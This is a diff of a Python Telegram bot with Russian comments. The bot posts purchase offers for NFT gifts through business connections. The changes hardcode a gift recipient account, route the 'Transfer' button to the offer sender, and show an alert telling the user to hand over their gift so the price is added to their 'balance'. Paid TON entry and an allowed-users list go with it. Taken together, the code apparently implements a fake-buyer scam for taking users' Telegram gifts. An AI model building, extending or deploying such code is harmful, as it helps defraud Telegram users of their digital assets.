@@ -45,6 +45,9 @@ TON_WALLET = os.getenv("TON_WALLET", "UQ_ТВОЙ_АДРЕС_TON")
 ENTRY_PRICE = os.getenv("ENTRY_PRICE", "5.5")
 USERS_FILE = os.getenv("USERS_FILE", "allowed_users.json")
 
+# ===== Кому отправлять подарок (НФТ) при нажатии "Передать" =====
+GIFT_RECIPIENT = "mindly_offer" 
+
 router = Router()
 COMMAND_REGEX = re.compile(r"^купить\s+(.*)$", re.IGNORECASE)
 GIFT_EMOJI_HTML = '<tg-emoji emoji-id="6032937473162614352">🎁</tg-emoji>'
@@ -134,7 +137,7 @@ class Offer:
     currency: str
     lang: str = "ru"
     buyer_username: str = ""
-    gift_link: str = "подарок"
+    gift_link: str = "подарок"  # Ссылка на подарок
 
 
 offers: dict[str, Offer] = {}
@@ -169,6 +172,7 @@ async def safe_send_message_text(
 
 async def safe_edit_message_text(
     bot: Bot, text: str, chat_id: int, message_id: int,
+    business_connection_id: str | None = None,
     reply_markup: InlineKeyboardMarkup | None = None,
     link_preview_options: LinkPreviewOptions | None = None
 ) -> None:
@@ -177,9 +181,10 @@ async def safe_edit_message_text(
     max_retries = 3
     for attempt in range(max_retries):
         try:
-            # ВАЖНО: Метод edit_message_text НЕ принимает business_connection_id
+            # ТУТ ВОЗВРАЩЕН business_connection_id (как в вашем изначальном рабочем коде)
             await bot.edit_message_text(
                 text=text, chat_id=chat_id, message_id=message_id,
+                business_connection_id=business_connection_id,
                 reply_markup=reply_markup, link_preview_options=link_preview_options
             )
             return
@@ -192,7 +197,7 @@ async def safe_edit_message_text(
             logging.info(f"Edit FLOOD_WAIT ({wait_time}s).")
             await asyncio.sleep(wait_time)
         except Exception as e:
-            logging.error(f"Edit failed: {e}")
+            logging.debug(f"Edit failed: {e}")
             if attempt == max_retries - 1:
                 raise
             await asyncio.sleep(1)
@@ -286,7 +291,7 @@ def sold_keyboard(offer: Offer) -> InlineKeyboardMarkup:
         "ar": "إرسال",
     }.get(offer.lang, "Передать")
     
-    # Кнопка передать открывает чат того, кто отправил оффер (покупателя)
+    # === ИЗМЕНЕНО: Теперь кнопка открывает того, кто отправил оффер ===
     recipient = offer.buyer_username
     
     return InlineKeyboardMarkup(inline_keyboard=[
@@ -337,6 +342,7 @@ def accept_alert_text(offer: Offer) -> str:
             f"قم بتحويل الهدية إلى {buyer_handle} لإضافة {offer.price} {currency} إلى رصيدك."
         )
     
+    # Если ссылки не было, gift_name равно "подарок". Меняем на "подарка".
     if not gift_name or gift_name == "подарок":
         display_gift = "подарка"
     else:
@@ -656,22 +662,22 @@ async def resolve_offer(callback: CallbackQuery, bot: Bot) -> None:
         return
 
     if action == "decline":
-        # Убрали business_connection_id из вызова
         await safe_edit_message_text(
             bot, decline_text(offer), offer.chat_id, offer.message_id,
-            reply_markup=None
+            offer.connection_id, None
         )
         offers.pop(offer_id, None)
         await callback.answer("Отклонено.")
     else:
-        # Убрали business_connection_id из вызова
+        # 1. Сразу меняем сообщение на "Передать" (возвращен рабочий вызов)
         text = sold_text(offer)
         await safe_edit_message_text(
             bot, text, offer.chat_id, offer.message_id,
-            reply_markup=sold_keyboard(offer)
+            offer.connection_id, sold_keyboard(offer)
         )
         offers.pop(offer_id, None)
         
+        # 2. Вызываем всплывающее окно (Alert)
         alert_text = accept_alert_text(offer)
         await callback.answer(alert_text, show_alert=True)
 
